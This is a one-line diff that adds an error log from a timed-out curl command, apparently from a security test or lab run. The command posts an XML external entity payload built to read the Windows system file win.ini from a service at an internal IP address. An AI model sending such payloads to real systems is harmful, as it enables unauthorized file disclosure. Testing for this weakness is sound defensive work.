@@ -1,0 +1,1 @@
+Error: Command '['curl.exe', '-s', '-X', 'POST', '-d', '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///windows/win.ini">]><root>&xxe;</root>', '-H', 'Content-Type: application/xml', 'http://10.242.10.31:8007/XXE/submit']' timed out after 10 seconds
